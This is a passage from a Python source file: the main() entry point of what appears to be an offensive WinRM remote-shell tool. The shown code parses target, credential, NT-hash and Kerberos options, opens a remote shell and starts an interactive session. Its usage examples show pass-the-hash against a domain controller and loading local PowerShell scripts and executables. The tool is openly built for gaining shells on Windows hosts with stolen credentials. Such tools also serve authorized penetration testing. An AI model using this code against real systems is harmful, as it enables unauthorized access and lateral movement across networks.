               "  %(prog)s 10.10.10.1 -u admin -p 'P@ssw0rd'\n"
               "  %(prog)s 10.10.10.1 -u admin -H aabbccdd... -s ./scripts\n"
               "  %(prog)s dc01.corp.local -u user -p pass -d CORP -S\n"
               "  %(prog)s dc01.corp.local -k -d CORP\n"
    )
    parser.add_argument("target", help="Target host (IP or hostname)")

    auth = parser.add_argument_group("authentication")
    auth.add_argument("-u", "--user", default="", help="Username")
    auth.add_argument("-p", "--password", default="", help="Password")
    auth.add_argument("-H", "--hash", dest="nt_hash", default=None,
                      help="NT hash for pass-the-hash (32 hex chars)")
    auth.add_argument("-k", "--kerberos", action="store_true",
                      help="Use Kerberos authentication")
    auth.add_argument("-d", "--domain", default="", help="Domain name")

    conn = parser.add_argument_group("connection")
    conn.add_argument("-P", "--port", type=int, default=None,
                      help="Port (default: 5985, or 5986 with SSL)")
    conn.add_argument("-S", "--ssl", action="store_true",
                      help="Use SSL/TLS")
    conn.add_argument("--no-verify", action="store_true", default=True,
                      help="Skip SSL certificate verification (default)")
    conn.add_argument("--verify", action="store_true",
                      help="Verify SSL certificate")
    conn.add_argument("--timeout", type=int, default=60,
                      help="Operation timeout in seconds (default: 60)")

    feat = parser.add_argument_group("features")
    feat.add_argument("-s", "--scripts", default=None,
                      help="Path to local PowerShell scripts directory")
    feat.add_argument("-e", "--executables", default=None,
                      help="Path to local executables directory")
    feat.add_argument("-l", "--log", default=None,
                      help="Log commands to file")
    feat.add_argument("--no-colors", action="store_true",
                      help="Disable colored output")
    feat.add_argument("--debug", action="store_true",
                      help="Print raw SOAP responses on errors")

    args = parser.parse_args()

    global NO_COLOR, DEBUG
    NO_COLOR = args.no_colors
    DEBUG = args.debug

    print_banner()

    port = args.port
    if port is None:
        port = 5986 if args.ssl else 5985

    auth_type = "ntlm"
    if args.kerberos:
        auth_type = "kerberos"

    if not args.kerberos and not args.user:
        parser.error("Username required (-u) unless using Kerberos (-k)")

    if args.nt_hash and len(args.nt_hash) != 32:
        parser.error("NT hash must be exactly 32 hex characters")

    verify_ssl = args.verify and not args.no_verify

    info(f"Target: {args.target}:{port} ({'SSL' if args.ssl else 'HTTP'})")
    info(f"Auth: {auth_type.upper()}" +
         (" (pass-the-hash)" if args.nt_hash else ""))
    if args.user:
        user_display = f"{args.domain}\\{args.user}" if args.domain else args.user
        info(f"User: {user_display}")

    try:
        client = WinRMClient(
            host=args.target,
            port=port,
            username=args.user,
            password=args.password,
            domain=args.domain,
            use_ssl=args.ssl,
            verify_ssl=verify_ssl,
            auth_type=auth_type,
            nt_hash=args.nt_hash,
            timeout=args.timeout,
        )
        info("Connecting...")
        client.open_shell()
        good("Shell opened successfully")
    except WinRMError as e:
        error(f"Connection failed: {e}")
        sys.exit(1)
    except Exception as e:
        error(f"Unexpected error: {e}")
        sys.exit(1)

    try:
        shell = InteractiveShell(
            client=client,
            user=args.user,
            host=args.target,
            scripts_path=args.scripts,
            executables_path=args.executables,
            log_file=args.log,
        )
        shell.cmdloop_with_interrupt()
    except Exception as e:
        error(f"Shell error: {e}")
    finally:
        client.disconnect()


if __name__ == "__main__":
    main()
